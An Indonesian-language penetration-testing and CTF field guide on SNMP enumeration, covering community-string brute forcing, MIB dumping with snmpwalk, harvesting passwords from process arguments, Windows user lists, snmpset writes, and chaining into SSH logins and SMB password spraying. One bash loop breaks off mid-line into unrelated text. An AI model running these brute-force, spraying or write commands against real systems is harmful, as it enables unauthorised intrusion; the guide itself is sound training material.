---
id: "10"
title: "10. SNMP Enumeration & Information Gathering Workflow — Master Field Guide"
category: "2. Network Services"
categoryId: "network"
filename: "10_snmp_workflow.md"
refs_out: ["03","04","05","06","08","09","11","14a","37","64"]
refs_in: ["04","09"]
---

# 10. SNMP Enumeration & Information Gathering Workflow — Master Field Guide

```text
==================================================================================
DOCUMENTATION TYPE : Service Enumeration & Reconnaissance Workflow
SERVICE TARGET     : Simple Network Management Protocol (SNMP v1 / v2c / v3)
DEFAULT PORTS      : UDP 161 (Standard SNMP Queries), UDP 162 (SNMP Traps)
TARGET AUDIENCE    : Penetration Testers, CTF Players (HTB / THM / Proving Grounds)
PLATFORM CONTEXT   : Parrot OS XFCE / Debian CLI
PREREQUISITES      : [03. Nmap Master Workflow & Network Scanning — Panduan Komprehensif](/docs/nmap-master), [04. Service Identification & Master Decision Tree — Pentest GPS Navigator](/docs/service-identification-decision-tree), [08. SMTP Exploitation & User Enumeration Workflow — Master Field Guide](/docs/smtp), [09. DNS Enumeration & Reconnaissance Workflow — Master Field Guide](/docs/dns)
==================================================================================
```

---

## 🧠 BAGIAN 1: SNMP FUNDAMENTALS

### 1.1 Apa itu SNMP dan Kegunaannya? (Analogi Petugas Sensor Gedung)

**Simple Network Management Protocol (SNMP)** adalah protokol lapisan aplikasi (bekerja di atas UDP) yang dirancang untuk memantau (*monitoring*), mengonfigurasi, dan mengelola perangkat jaringan secara terpusat (seperti router, switch, firewall, server Linux, server Windows, dan printer).

```text
+=============================================================================+
|                      ANALOGI PETUGAS SENSOR GEDUNG                          |
+=============================================================================+
|                                                                             |
|  [ SNMP MANAGER (Sistem Monitoring Pusat) ]                                 |
|  Bertanya: "Sensor AC Lantai 3, berapa suhu ruangan sekarang?"              |
|                                │                                            |
|                       (Query UDP Port 161)                                  |
|                                ▼                                            |
|  [ SNMP AGENT (Daemon di Server / Router Target) ]                          |
|  Membuka buku catatan (MIB), membaca nilai sensor (OID), lalu menjawab:     |
|  "Suhu ruangan saat ini adalah 21 derajat Celcius."                         |
|                                                                             |
|  [ SNMP TRAP (Alarm Darurat Tanpa Ditanya - UDP 162) ]                      |
|  Jika terjadi kebakaran (Server Reboot / Link Down), Agent otomatis         |
|  mengirimkan sinyal alarm sepihak ke Manager di Port 162.                  |
+=============================================================================+
```

* **Kenapa SNMP Sering Diabaikan Pemula?**  
  Karena SNMP berjalan di atas protokol **UDP Port 161**. Kebanyakan pemula hanya menjalankan pemindaian TCP default (`nmap -sS $TARGET`), sehingga layanan SNMP yang aktif tidak pernah terdeteksi!

---

### 1.2 Perbedaan SNMP v1 vs. v2c vs. v3 (Implikasi Keamanan)

```text
+----------+-----------------------+----------------------+-------------------------------------------+
| Versi    | Mekanisme Autentikasi | Enkripsi Data        | Implikasi Keamanan & Nilai Pentest        |
+----------+-----------------------+----------------------+-------------------------------------------+
| SNMP v1  | Community String      | TIDAK ADA ENKRIPSI   | **SANGAT RENTAN**. Password dikirim       |
|          | (Plaintext)           | (Cleartext)          | dalam bentuk teks polos. Menggunakan      |
|          |                       |                      | counter 32-bit. Mudah disadap & dispray.  |
+----------+-----------------------+----------------------+-------------------------------------------+
| SNMP v2c | Community String      | TIDAK ADA ENKRIPSI   | **PALING SERING DI CTF**. Tetap plaintext |
|          | (Plaintext)           | (Cleartext)          | password, tetapi mendukung query massal   |
|          |                       |                      | cepat (`GETBULK`) & counter 64-bit.       |
+----------+-----------------------+----------------------+-------------------------------------------+
| SNMP v3  | User-based Security   | Mendukung Enkripsi   | **AMAN JIKA TERKONFIGURASI DENGAN BAIK**. |
|          | Model (USM) dengan    | Kriptografi Penuh    | Menggunakan username, hashing (MD5/SHA),  |
|          | username & password   | (DES / AES)          | dan cipher (AES). Kebal penyadapan pasif. |
+----------+-----------------------+----------------------+-------------------------------------------+
```

---

### 1.3 Apa itu Community String? (Password Berkedok Label)

Pada SNMP versi 1 dan 2c, **Community String** berfungsi sebagai *pre-shared password* sederhana yang menentukan tingkat hak akses klien terhadap server:

1. **`public` (Read-Only Access)**:
   * String default bawaan hampir seluruh perangkat di dunia.
   * Mengizinkan klien membaca seluruh informasi sistem, daftar proses aktif, antarmuka jaringan, software terinstal, hingga daftar user.
2. **`private` (Read-Write Access)**:
   * Mengizinkan klien membaca **dan mengubah** konfigurasi perangkat (misal: mengganti konfigurasi router, mematikan interface, atau mengubah parameter sistem).
3. **Common Strings Lainnya**: `manager`, `admin`, `default`, `cisco`, `community`, `monitor`, `internal`.

---

### 1.4 Konsep MIB (Management Information Base) dan OID (Object Identifier)

Informasi di dalam server SNMP diorganisir dalam pohon hierarki data terstruktur yang disebut **MIB**. Setiap node atau cabang data di dalam pohon ini memiliki alamat identitas numerik unik yang disebut **OID (Object Identifier)**.

```text
+=============================================================================+
|                      ANALOGI POHON HIERARKI OID                             |
+=============================================================================+
|                                                                             |
|  Root ( . )                                                                 |
|   └── 1 (iso)                                                               |
|        └── 1.3 (org)                                                        |
|             └── 1.3.6 (dod)                                                 |
|                  └── 1.3.6.1 (internet)                                     |
|                       └── 1.3.6.1.2 (mgmt)                                  |
|                            └── 1.3.6.1.2.1 (mib-2)                          |
|                                 ├── 1.3.6.1.2.1.1 (system) ──> [sysDescr]   |
|                                 ├── 1.3.6.1.2.1.2 (interfaces)             |
|                                 └── 1.3.6.1.2.1.25 (host resources)        |
|                                      ├── .25.4 (running processes)          |
|                                      └── .25.6 (installed software)         |
+=============================================================================+
```

* **Format Penulisan OID**:
  * **Numerik**: `1.3.6.1.2.1.1.1.0` (Alamat pasti yang dimengerti mesin).
  * **Tekstual**: `SNMPv2-MIB::sysDescr.0` (Representasi ramah manusia jika database MIB terpasang).

---

### 1.5 Perbedaan SNMP Walk vs. SNMP Get

* **SNMP Get (`snmpget`)**:
  * Mengambil nilai dari **SATU OID SPESIFIK** secara langsung.
  * Sangat cepat dan efisien jika kita sudah mengetahui alamat OID target (contoh: hanya ingin mengambil hostname mesin).
* **SNMP Walk (`snmpwalk`)**:
  * Mengirim serangkaian permintaan `GETNEXT` berturut-turut untuk menelusuri seluruh sub-pohon (*subtree*) dari OID awal hingga akhir secara rekursif.
  * Menghasilkan *dump* data ribuan baris informasi sistem secara menyeluruh (*Full Dump*).

---

### 1.6 Cara Membaca Output SNMP

Setiap baris respon SNMP selalu memiliki format standar:

```text
ISO.3.6.1.2.1.1.1.0 = STRING: "Linux debian-target 5.10.0-8-amd64 #1 SMP Debian x86_64"
│                     │       │
│                     │       └── Nilai data yang sebenarnya (Value)
│                     └── Tipe data (STRING, INTEGER, Hex-STRING, Counter32, Timeticks)
└── Alamat OID yang menyimpan data tersebut
```

---

## 🛠️ BAGIAN 2: TOOL ARSENAL SNMP

```text
=======================================================================================================
TOOL               FUNGSI UTAMA                    KECEPATAN   PROTOKOL    PENGGUNAAN UTAMA DI CTF
=======================================================================================================
onesixtyone        High-Speed Community Brute Force Ekstrem    UDP 161     Menemukan valid community string
snmpwalk           Recursive Subtree MIB Dumper    Sedang      UDP 161     Dump seluruh database MIB target
snmp-check         Human-Readable Auto Formatter   Cepat       UDP 161     Peta informasi rapi dalam 5 detik
snmpget            Single OID Direct Query         Sangat Cepat UDP 161     Ekstraksi OID spesifik yang ditarget
snmpbulkwalk       Fast Bulk Subtree Traversal     Tinggi      UDP 161     Alternatif cepat snmpwalk (v2c/v3)
nmap (NSE)         Vulnerability & Audit Scripts   Sedang      UDP 161     Ekstraksi user, network & sysdescr
msfconsole         Metasploit Auxiliary Modules    Sedang      UDP 161     Automated scanning & brute force
=======================================================================================================
```

---

### 2.1 `onesixtyone` — High-Speed Community String Bruter

`onesixtyone` adalah scanner SNMP tercepat di Linux yang mampu mengirim ratusan permintaan community string per detik menggunakan thread paralel.

* **Kapan Digunakan**: Langkah pertama begitu port 161 UDP terdeteksi terbuka.
* **Flag Penting**:
  * `-c <file>` : File wordlist community string.
  * `-i <file>` : Target IP list file.
  * `-o <file>` : Output log file.
  * `-w <ms>` : Waktu tunggu balasan paket (default: 10ms).

```bash
# Menjalankan bruteforce community string terhadap target
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.11.200
```

* **Contoh Output Nyata**:
```text
Scanning 1 hosts, 114 communities
10.10.11.200 [public] Linux target-box 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64
10.10.11.200 [backup] Linux target-box 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64
```
* **Hasil**: Ditemukan dua valid community string: `public` dan `backup`!

---

### 2.2 `snmpwalk` — Recursive MIB Tree Dumper

Tool standar dari paket `net-snmp` untuk mengunduh seluruh informasi dari akar MIB atau sub-cabang tertentu.

* **Flag Penting**:
  * `-v 1` / `-v 2c` / `-v 3` : Versi SNMP yang digunakan.
  * `-c <community>` : Community string yang valid.
  * `-t <sec>` : Timeout per query (default: 1 detik).
  * `-r <retries>` : Jumlah percobaan ulang jika paket UDP hilang.

```bash
# Dump seluruh pohon MIB menggunakan community 'public' versi 2c
snmpwalk -v2c -c public 10.10.11.200
```

---

### 2.3 `snmp-check` — Human-Readable Automated Formatter

Skrip Ruby cerdas yang secara otomatis mengekstrak informasi penting dari MIB dan menampilkannya dalam format laporan terstruktur yang sangat rapi.

```bash
# 1. Cek apakah snmp-check sudah terpasang di sistem:
which snmp-check || echo "NOT INSTALLED"

# 2. Install jika belum tersedia di Parrot OS:
sudo apt update && sudo apt install snmp-check -y

# 3. Verifikasi instalasi:
snmp-check --version

# 4. Jalankan enumerasi otomatis:
snmp-check -t 10.10.11.200 -c public
```

* **Alternatif jika `snmp-check` tidak tersedia**: Gunakan `snmpwalk` dengan filter cepat berikut:
```bash
snmpwalk -v2c -c public 10.10.11.200 | grep -E "sysDescr|sysName|ifDescr|ipAddr" | head -n 30
```

---

### 2.4 `snmpget` — Single OID Direct Query

Digunakan saat Anda sudah mengetahui OID target spesifik dan hanya butuh mengambil nilainya tanpa overhead waktu download.

```bash
# Mengambil informasi sistem operasi (sysDescr)
snmpget -v2c -c public 10.10.11.200 1.3.6.1.2.1.1.1.0
```

---

### 2.5 `snmpbulkwalk` — High-Speed Bulk Dumper

Menggunakan perintah `GETBULK` bawaan SNMP v2c/v3 untuk mengambil banyak OID dalam satu paket respons UDP tunggal, sehingga 5–10x lebih cepat daripada `snmpwalk`.

```bash
# Sintaks Standar Bulk Query:
snmpbulkwalk -v2c -c public -Cn0 -Cr10 -t 3 -r 2 10.10.11.200 1.3.6.1.2.1.25
```

* **Penjelasan Flag Penting**:
  * `-Cn0` : *Non-repeaters = 0* (Tidak ada OID awal yang di-query hanya sekali).
  * `-Cr10` : *Max-repetitions = 10* (Ambil 10 OID per paket GETBULK). Semakin tinggi angka ini, semakin cepat prosesnya, namun pada koneksi VPN dengan latency tinggi, nilai `-Cr10` jauh lebih aman dari packet drop dibandingkan `-Cr20`.
  * `-t 3` : Timeout 3 detik.
  * `-r 2` : Coba ulang 2 kali jika paket UDP hilang di jaringan.

---

### 2.6 `nmap` NSE Scripts untuk SNMP

Gunakan daftar script eksplisit yang andal beserta parameter community string:

```bash
# 1. Pemindaian Script Lengkap yang Andal:
nmap -sU -p 161 \
  --script snmp-info,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-users \
  --script-args snmpcommunity=public \
  10.10.11.200

# 2. Atau Menggunakan Wildcard dengan Parameter Community:
nmap -sU -p 161 --script "snmp-*" --script-args snmpcommunity=public 10.10.11.200
```

---

### 2.7 Metasploit Auxiliary Modules

```bash
# 1. Scanner Community String Otomatis
msfconsole -q -x "use auxiliary/scanner/snmp/snmp_login; set RHOSTS 10.10.11.200; run; exit"

# 2. Enumerasi Komprehensif via Metasploit
msfconsole -q -x "use auxiliary/scanner/snmp/snmp_enum; set RHOSTS 10.10.11.200; run; exit"
```

---

## 🎯 BAGIAN 3: WORKFLOW UTAMA (STEP BY STEP)

```bash
# Setup Environment Variable Target di Terminal Parrot OS:
export TARGET="10.10.11.200"
export COMMUNITY="public"
echo "Target SNMP: $TARGET | Community: $COMMUNITY"
```

---

### FASE 1: DETEKSI SNMP (PORT 161 UDP SCANNING)

> [!IMPORTANT]
> **KENAPA UDP SCAN BERBEDA DARI TCP?**  
> UDP adalah protokol *connectionless* tanpa *handshake* SYN-ACK. Jika port UDP terbuka, target biasanya **TIDAK MENGIRIMKAN RESPON** jika paket probe tidak sesuai format yang diharapkan, sehingga Nmap menandainya sebagai `open|filtered`.  
> Untuk memicu respon aktif dari SNMP, kita harus mengirimkan probe paket SNMP valid.

```bash
# 1. Pemindaian Cepat Port 161 UDP Menggunakan Nmap (Wajib sudo!)
sudo nmap -sU -p 161 -Pn $TARGET

# 2. Verifikasi Respon SNMP Menggunakan Nmap Script Probe
sudo nmap -sU -p 161 --script snmp-info -Pn $TARGET
```

* **Contoh Output Nyata Nmap**:
```text
PORT    STATE SERVICE REASON
161/udp open  snmp    udp-response ttl 63
| snmp-info: 
|   enterprise: net-snmp
|   engineBoots: 1
|_  snmpEngineTime: 1h14m22s
```
* **Status `open`**: Menandakan server SNMP aktif dan merespon kueri UDP secara langsung!

---

### FASE 2: COMMUNITY STRING BRUTE FORCE

Jika community string belum diketahui, lakukan brute force terarah:

```bash
# 1. Brute Force Menggunakan onesixtyone (Paling Direkomendasikan)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET

# 2. Wordlist Cadangan SecLists yang Lebih Komprehensif:
# /usr/share/seclists/Discovery/SNMP/snmp.txt
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $TARGET
```

#### Daftar 12 Community String Default yang Wajib Dicoba Manual:
```text
public      private     manager     admin       cisco       default
community   monitor     internal    network     read        snmp
```

```bash
# Uji Coba Cepat Manual Menggunakan snmpget:
for comm in public private manager admin default; do
  res=$(snmpget -v2c -c $comm -t 1 $TARGET 1.3.6.1.2.1.1.5.0 2>/dev/null)
  if [ -n "$res" ]; then
    echo -e "\033[1;32m[+] VALID COMMUNITY STRING DITEMUKAN: $comm\033[06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)!

---

#### 3b. Network Interfaces & Routing Table
* **OID Utama**: `1.3.6.1.2.1.2` (`interfaces`) dan `1.3.6.1.2.1.4.20` (`ipAddrTable`)

```bash
# 1. Ekstraksi Seluruh Antarmuka Jaringan & MAC Address
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.2.2.1.2

# 2. Ekstraksi Alamat IP per Antarmuka (Menemukan Subnet Internal / Dual-NIC)
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.4.20.1.1
```
* **Contoh Output**:
```text
IP-MIB::ipAdEntAddr.10.10.11.200 = IpAddress: 10.10.11.200
IP-MIB::ipAdEntAddr.172.16.10.1   = IpAddress: 172.16.10.1
```
* **Temuan Emas**: Target memiliki kartu jaringan kedua yang terhubung ke jaringan internal privat `172.16.10.0/24`!

---

#### 3c. Running Processes & Leaked Commandline Passwords (SANGAT BERHARGA!)
* **OID Utama**: `1.3.6.1.2.1.25.4.2.1` (`hrSWRunTable`)

```bash
# 1. Ekstraksi Nama Seluruh Proses yang Sedang Berjalan
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.4.2.1.2

# 2. Ekstraksi Lengkap Beserta Parameter Command-Line Arguments:
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.4.2.1.5
```

* **Contoh Output Nyata (Leaked Credentials di CTF)**:
```text
HOST-RESOURCES-MIB::hrSWRunParameters.1024 = STRING: "--port 8080 --config /etc/app.conf"
HOST-RESOURCES-MIB::hrSWRunParameters.1450 = STRING: "-u root -pSuperSecretDBPass2024! -h 127.0.0.1 db_prod"
HOST-RESOURCES-MIB::hrSWRunParameters.1890 = STRING: "/opt/backup.sh --token=ghp_98a7sd98f7a9sd8f7asdf"
```
* **Analisis**: Kita menemukan password database `SuperSecretDBPass2024!` dan token GitHub yang dieksekusi oleh proses background cron job!

---

#### 3d. Installed Software (Windows / Linux)
* **OID Utama**: `1.3.6.1.2.1.25.6.3.1.2` (`hrSWInstalledName`)

```bash
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.6.3.1.2
```
* **Contoh Output**:
```text
HOST-RESOURCES-MIB::hrSWInstalledName.1 = STRING: "Apache 2.4.41"
HOST-RESOURCES-MIB::hrSWInstalledName.2 = STRING: "FileZilla Server 0.9.41"
HOST-RESOURCES-MIB::hrSWInstalledName.3 = STRING: "OpenSSH for Windows 7.7p1"
```
* **Analisis**: Versi software teridentifikasi secara presisi tanpa perlu melakukan banner grabbing manual, memudahkan pencarian CVE di Searchsploit.

---

#### 3e. User Accounts (Khusus Windows)
* **OID Utama**: `1.3.6.1.4.1.77.1.2.25` (`svUserName`)

```bash
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.77.1.2.25
```
* **Contoh Output**:
```text
iso.3.6.1.4.1.77.1.2.25.1.1.5.97.100.109.105.110 = STRING: "admin"
iso.3.6.1.4.1.77.1.2.25.1.1.6.106.111.114.100.97.110 = STRING: "jordan"
iso.3.6.1.4.1.77.1.2.25.1.1.9.115.101.99.114.101.116.97.114.121 = STRING: "secretary"
```

```bash
# Ekstraksi Daftar Username Bersih via Bash Pipe:
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.77.1.2.25 | awk -F': ' '{print $2}' | tr -d '"' | sort -u > snmp_users.txt
cat snmp_users.txt
```

---

#### 3f. Active TCP Connections / Hidden Local Ports
* **OID Utama**: `1.3.6.1.2.1.6.13.1.3` (`tcpConnLocalPort`)

```bash
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.6.13.1.3 | sort -u
```
* **Contoh Output**:
```text
TCP-MIB::tcpConnLocalPort.0.0.0.0.22 = INTEGER: 22
TCP-MIB::tcpConnLocalPort.127.0.0.1.3306 = INTEGER: 3306
TCP-MIB::tcpConnLocalPort.127.0.0.1.8080 = INTEGER: 8080
```
* **Temuan**: Port `3306` (MySQL) dan `8080` (Internal Web) aktif di localhost `127.0.0.1`. Kita bisa menyiapkan SSH Port Forwarding ([06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)) untuk mengaksesnya!

---

#### 3g. Cara Menyimpan & Memfilter Output `snmpwalk` yang Panjang (Best Practice CTF)

Perintah `snmpwalk` seringkali mengembalikan ribuan hingga puluhan ribu baris data. Jangan membaca output baris demi baris di terminal secara mentah! Simpan ke file teks lalu gunakan filter praktis berikut:

```bash
# 1. Simpan Seluruh Output MIB Dump ke File Lokal Terlebih Dahulu:
snmpwalk -v2c -c $COMMUNITY $TARGET > snmp_full_dump.txt
wc -l snmp_full_dump.txt   # Cek total jumlah baris

# 2. Filter Semua Nilai Bertipe STRING (Bagian yang Paling Mudah Dibaca Manusia):
grep "STRING:" snmp_full_dump.txt

# 3. Berburu Kredensial Sensitif & Password (PRIORITAS NOMOR 1!):
grep -iE "pass|pwd|secret|token|key|login|cred" snmp_full_dump.txt

# 4. Filter Khusus Daftar Proses & Parameter Command-Line:
grep "hrSWRun" snmp_full_dump.txt

# 5. Filter Khusus Informasi Jaringan & Interface:
grep -E "ipAddr|ifDescr|ipRoute" snmp_full_dump.txt

# 6. Filter Khusus Daftar Akun Pengguna Windows (OID LAN Manager):
grep "77.1.2.25" snmp_full_dump.txt

# 7. Ekstraksi Seluruh String Bersih Tanpa Label OID:
grep "STRING:" snmp_full_dump.txt | awk -F'STRING: ' '{print $2}' | tr -d '"' | sort -u > clean_strings.txt
```

---

### FASE 4: TARGETED OID QUERY & DECODING

Jika output data berbentuk **Hex-STRING**, konversikan kembali ke format teks ASCII:

```bash
# Contoh Output: Hex-STRING: 41 64 6D 69 6E 69 73 74 72 61 74 6F 72
echo "41 64 6D 69 6E 69 73 74 72 61 74 6F 72" | xxd -r -p
# Output: Administrator
```

---

### FASE 5: SNMP v3 TESTING (JIKA v1/v2c GAGAL)

Jika brute force community string v1/v2c tidak membuahkan hasil, kemungkinan besar server menjalankan **SNMP v3**.

```bash
# 1. Deteksi EngineID dan Konfirmasi SNMP v3 Menggunakan Nmap:
nmap -sU -p 161 --script snmp-info $TARGET

# 2. Query SNMP v3 Menggunakan Kredensial (Jika diperoleh dari file konfigurasi/backup):
# -l authPriv : Security level (Autentikasi + Enkripsi)
# -u <user>   : Username
# -a SHA      : Algoritma Auth (MD5/SHA)
# -A <pass>   : Auth Password
# -x AES      : Algoritma Priv (DES/AES)
# -X <pass>   : Priv Encryption Password
snmpwalk -v3 -l authPriv -u snmpuser -a SHA -A 'AuthPass123' -x AES -X 'PrivPass123' $TARGET
```

---

## 📋 BAGIAN 4: OID CHEAT SHEET LENGKAP

Berikut adalah tabel referensi OID paling berharga untuk penetration testing dan auditing:

```text
+----------------------------+-----------------------------+-----------------+------------------------------------------+
| OID Numerik                | Nama Simbolis MIB           | Platform Target | Deskripsi & Nilai Intelijen              |
+----------------------------+-----------------------------+-----------------+------------------------------------------+
| 1.3.6.1.2.1.1.1.0          | sysDescr                    | Linux / Windows | Versi OS, kernel, arsitektur CPU.        |
| 1.3.6.1.2.1.1.4.0          | sysContact                  | Linux / Windows | Email / identitas administrator.         |
| 1.3.6.1.2.1.1.5.0          | sysName                     | Linux / Windows | Hostname resmi server / router.          |
| 1.3.6.1.2.1.1.6.0          | sysLocation                 | Linux / Windows | Lokasi fisik data center / server.       |
| 1.3.6.1.2.1.2.2.1.2        | ifDescr                     | Linux / Windows | Daftar deskripsi interface jaringan.     |
| 1.3.6.1.2.1.2.2.1.6        | ifPhysAddress               | Linux / Windows | MAC Address seluruh interface.           |
| 1.3.6.1.2.1.4.20.1.1       | ipAdEntAddr                 | Linux / Windows | Seluruh IP address yang terpasang.       |
| 1.3.6.1.2.1.4.21.1.1       | ipRouteDest                 | Linux / Windows | Routing table jaringan internal.         |
| 1.3.6.1.2.1.6.13.1.3       | tcpConnLocalPort            | Linux / Windows | Port TCP yang sedang aktif mendengarkan. |
| 1.3.6.1.2.1.7.5.1.2        | udpLocalPort                | Linux / Windows | Port UDP yang sedang aktif mendengarkan. |
| 1.3.6.1.2.1.25.1.1.0       | hrSystemUptime              | Linux / Windows | Lama waktu server hidup sejak reboot.    |
| 1.3.6.1.2.1.25.2.3.1.3     | hrStorageDescr              | Linux / Windows | Partisi disk, mounted drive, RAM, Swap.  |
| 1.3.6.1.2.1.25.4.2.1.2     | hrSWRunName                 | Linux / Windows | Daftar nama proses yang sedang berjalan. |
| 1.3.6.1.2.1.25.4.2.1.4     | hrSWRunPath                 | Linux / Windows | Path absolut binary dari proses aktif.   |
| 1.3.6.1.2.1.25.4.2.1.5     | hrSWRunParameters           | Linux / Windows | **PARAMETER PROSES (LEAK PASSWORD!).**   |
| 1.3.6.1.2.1.25.6.3.1.2     | hrSWInstalledName           | Windows         | Daftar seluruh software terinstal.       |
| 1.3.6.1.4.1.77.1.2.25      | svUserName                  | Windows         | **DAFTAR USERNAME AKUN WINDOWS.**        |
| 1.3.6.1.4.1.77.1.2.27      | svShareName                 | Windows         | Daftar nama SMB Share yang dibuka.       |
| 1.3.6.1.4.1.77.1.2.3       | svServiceInstalledName      | Windows         | Service background Windows yang aktif.   |
| 1.3.6.1.4.1.2021.11.9.0    | ssCpuUser                   | Linux (UCD-SNMP)| Penggunaan CPU oleh user di Linux.       |
| 1.3.6.1.4.1.2021.4.5.0     | memTotalReal                | Linux (UCD-SNMP)| Total kapasitas RAM fisik di Linux.      |
+----------------------------+-----------------------------+-----------------+------------------------------------------+
```

---

## 🏢 BAGIAN 5: SNMP DI ACTIVE DIRECTORY ENVIRONMENT

Ketika server target menjalankan Windows Server atau berperan sebagai **Active Directory Domain Controller**, SNMP adalah jalan pintas terbaik untuk memetakan domain tanpa harus memiliki kredensial awal:

1. **Dump Username Akun Windows Secara Masif**:
   ```bash
   snmpwalk -v2c -c public $TARGET 1.3.6.1.4.1.77.1.2.25 | awk -F': ' '{print $2}' | tr -d '"' > ad_users_raw.txt
   ```
2. **Identifikasi Peran Server**:
   Periksa OID `1.3.6.1.4.1.77.1.2.3` (Installed Services). Jika ditemukan service seperti `Active Directory Domain Services`, `Kerberos Key Distribution Center`, atau `DNS Server`, target dipastikan adalah **Domain Controller (DC)**!
3. **Chaining ke Kerberos**:
   Daftar user dari SNMP dapat langsung dimasukkan ke `impacket-GetNPUsers` untuk meminta ticket tanpa pre-autentikasi (AS-REP Roasting).

---

## ✍️ BAGIAN 6: SNMP WRITE ACCESS (JIKA "private" WRITABLE)

Jika proses brute force menemukan community string dengan izin tulis (*Read-Write Access*, biasanya bernama `private` atau `manager`):

### 1. Apa Saja yang Bisa Dilakukan?
* **Mengubah Nilai Konfigurasi**: Mengganti string `sysContact` atau `sysLocation`.
* **Cisco Config Download via TFTP**: Pada perangkat router/switch Cisco dengan SNMP writable, penyerang dapat memerintahkan router untuk mengunggah file `running-config` (berisi password enable & hash admin) ke server TFTP milik penyerang!

### 2. Modifikasi OID Menggunakan `snmpset`
```bash
# Mengubah string sysContact menjadi kontak baru:
snmpset -v2c -c private $TARGET 1.3.6.1.2.1.1.4.0 s "Hacked by Pentester"

# Verifikasi perubahan:
snmpget -v2c -c public $TARGET 1.3.6.1.2.1.1.4.0
```

---

## 🌳 BAGIAN 7: DECISION TREE LENGKAP

```text
                        [PORT 161 (UDP) DETECTED]
                                    │
                    ┌───────────────┴───────────────┐
                    │                               │
            [NMAP UDP PROBE]                [ONESIXTYONE BRUTE]
         sudo nmap -sU -p 161               onesixtyone -c snmp.txt
                    │                               │
                    └───────────────┬───────────────┘
                                    │
                    [APAKAH COMMUNITY VALID DITEMUKAN?]
                                    │
                 ┌──────────────────┴──────────────────┐
                 │                                     │
           [YES: VALID STRING]                   [NO: GAGAL]
        (misal: 'public' / 'backup')                   │
                 │                                     ▼
                 │                             [UJI SNMP v3]
                 │                             nmap -sU -p 161 --script snmp-info
                 │                             Cek EngineID & coba auth credentials
                 ▼                                     │
        [RUN FULL ENUMERATION]                         ▼
        snmp-check $TARGET -c $COMMUNITY      Lanjut ke Port Lain
                 │
  ┌──────────────┴──────────────────────────────┐
  │                                             │
[LINUX TARGET]                           [WINDOWS TARGET]
  │                                             │
  ├── 1. Baca Process List Parameters           ├── 1. Dump User Accounts (svUserName)
  │      grep -iE "pass|secret|token"           │      Buat 'users.txt' untuk AD Spraying
  │                                             │
  ├── 2. Cek Network Interfaces & Subnet        ├── 2. Dump Installed Software
  │      Temukan IP internal / Dual-NIC         │      Cari celah CVE software lama
  │                                             │
  └── 3. Cek Local Listening Ports (3306/8080)  └── 3. Cek Running Processes
         Siapkan SSH Tunneling                         Temukan service DC / Kerberos
  │                                             │
  └──────────────────────┬──────────────────────┘
                         │
                 [ATTACK CHAINING]
                         │
     ┌───────────────────┼───────────────────┐
     │                   │                   │
[PASSWORD LEAK]    [USER SPRAYING]     [INTERNAL PIVOT]
Login SSH (Port 22)Spray SMB (Port 445)Pivoting via SSH Tunnel
[File 06]          [File 05]           ke Subnet Baru
```

---

## 🔗 BAGIAN 8: SNMP + ATTACK CHAINING

```text
+=============================================================================+
|                       SNMP ATTACK CHAINING TAXONOMY                         |
+=============================================================================+
```

### 🔗 Chain 1: SNMP Process List ➔ Password di Command-Line ➔ SSH Shell

```text
[ SNMP WALK PROCESSES ] ──> hrSWRunParameters: "/bin/bash /opt/backup.sh -p Summer2024!"
                                     │
                                     ▼
                     [ KREDENSIAL DITEMUKAN: Summer2024! ]
                                     │
                                     ▼
                     [ SSH LOGIN: user@$TARGET:22 ] ──> Initial Foothold Shell!
```

```bash
# Filter command line arguments yang mengandung kata kunci sensitif:
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.4.2.1.5 | grep -iE "pass|pwd|secret|token|key|admin"
```

---

### 🔗 Chain 2: SNMP Windows User Enum ➔ SMB / SSH Password Spraying

```bash
# 1. Ekstrak daftar user dari SNMP Windows
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.77.1.2.25 | awk -F': ' '{print $2}' | tr -d '"' > users.txt

# 2. Lakukan password spraying ke SMB (Modul 05)
nxc smb $TARGET -u users.txt -p 'Welcome2024!' --continue-on-success
```

---

### 🔗 Chain 3: Installed Software List ➔ CVE Searchsploit

```bash
# 1. Dump software terinstal
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.6.3.1.2 > installed_apps.txt

# 2. Cari exploit dari aplikasi yang terdeteksi
searchsploit "Apache 2.4.41"
```

---

### 🔗 Chain 4: Network Interfaces ➔ Hidden Internal Subnet Discovery

```bash
# Temukan IP internal non-publik
snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.4.20.1.1
# Jika ditemukan IP 172.16.10.1, gunakan SSH Dynamic SOCKS5 Proxy (-D 1080) di Modul 06 untuk memindai subnet tersebut!
```

---

### 🔗 Chain 5: System Description ➔ Exact OS & Kernel Exploit Search

```bash
# Ekstrak versi kernel eksak
snmpget -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.1.1.0
# Contoh: Linux 3.13.0-32-generic ➔ Rentan Dirty COW (CVE-2016-5195)
```

---

## 🔧 BAGIAN 9: COMMON ERRORS & TROUBLESHOOTING (10 ERROR SOLUTIONS)

### 1. Nmap UDP Scan Menunjukkan `open|filtered` pada Port 161
* **Penyebab**: Server tidak merespon paket probe UDP Nmap standar, atau firewall menolak paket tanpa mengirimkan pesan ICMP unreachable.
* **Solusi CLI**: Jalankan `onesixtyone` dengan community string `public`. Jika server merespon `onesixtyone`, berarti port 161 **benar-benar terbuka**!

---

